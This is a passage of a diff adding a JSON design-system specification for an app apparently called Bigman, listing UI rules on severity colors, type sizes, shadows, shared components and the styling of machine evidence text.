+      "Every number opens to a table, every row opens to evidence, through one side panel.",
+      "Light and dark from the same token names; the system preference decides unless Setup pins one."
+    ],
+    "rules": [
+      {
+        "name": "The Reserved Severity Rule",
+        "body": "Info, Review and High hues appear only on severity: the SeverityBadge and severity-matched evidence lines. They are never used for decoration, charts, buttons or status. Severity is always icon plus word (Info, Eye, TriangleAlert icons), never color alone.",
+        "section": "colors"
+      },
+      {
+        "name": "The One Ink Rule",
+        "body": "The violet accent marks interaction and first sightings, nothing else. Diff additions are neutral (`sunken`), not accent; chart lines are ink, not accent.",
+        "section": "colors"
+      },
+      {
+        "name": "The Quiet Green Rule",
+        "body": "Calm green is an 8 px dot beside a sentence, never a badge, fill or verdict, and never next to the words safe, clean, protected or secure.",
+        "section": "colors"
+      },
+      {
+        "name": "The Three Sizes Rule",
+        "body": "Only `text-small`, `text-body` and `text-title` exist; Tailwind's type scale is removed. Hierarchy within a size comes from weight (600) and ink (`ink` vs `ink-muted`), not from new sizes.",
+        "section": "typography"
+      },
+      {
+        "name": "The Evidence Is Mono Rule",
+        "body": "Anything copied from the machine (paths, hashes, file contents, tool error text) is set in the mono face; anything Bigman says in its own voice is sans. A rule note beside an evidence line switches back to sans 600.",
+        "section": "typography"
+      },
+      {
+        "name": "The Float-Only Shadow Rule",
+        "body": "A shadow means \"this sits above the page and will go away.\" Tiles, tables, timelines and evidence are outlined, never lifted.",
+        "section": "elevation"
+      }
+    ],
+    "dos": [
+      "Do take every color, size and radius from `design/tokens.css` by token name; add a token there before using a new value.",
+      "Do mark a first sighting with the ringed violet FirstSeenMarker and fold its repeats under it with a Tally and \"seen N times, first on <date>\".",
+      "Do show severity as SeverityBadge (icon plus Info, Review or High) and sort findings severity-first, first-seen on top.",
+      "Do right-align figures to one margin and keep before/after columns on shared fixed gutters.",
+      "Do open every figure through the single Drilldown panel (tile, then table, then evidence).",
+      "Do route every state-changing action through PreviewDialog (plan, confirm, result, undo where possible).",
+      "Do keep each screen to the three sizes (13, 15, 20 px) and two weights (400, 600).",
+      "Do set machine text (paths, hashes, file contents, tool errors) in Atkinson Hyperlegible Mono.",
+      "Do cover all six states with the shared components: Skeleton, EmptyState, the view, StatusLine, IncompleteNotice with CoverageList, and the disconnected notice."
+    ],
+    "donts": [
+      "Don't use the info, review or high hues for anything but severity, and don't use the accent for anything but interaction and first sightings.",
+      "Don't use calm green as a badge, fill or verdict; it is an 8 px dot beside a sentence.",
+      "Don't put a shadow on a resting tile, table, timeline or evidence block; shadows belong to the drill-down, dialog and toasts.",
+      "Don't add a fourth type size, uppercase labels, letter-spacing, or a display face.",
+      "Don't use the red-shield logo inside the app; the rail carries the monochrome B mark.",
+      "Don't build a feature-local side panel, modal flow or loading spinner when Drilldown, PreviewDialog and Skeleton exist.",
+      "Don't animate anything that carries no meaning, and don't animate position on Timeline rows (they are positioned by transform; fade opacity only)."
+    ]
+  }
+}
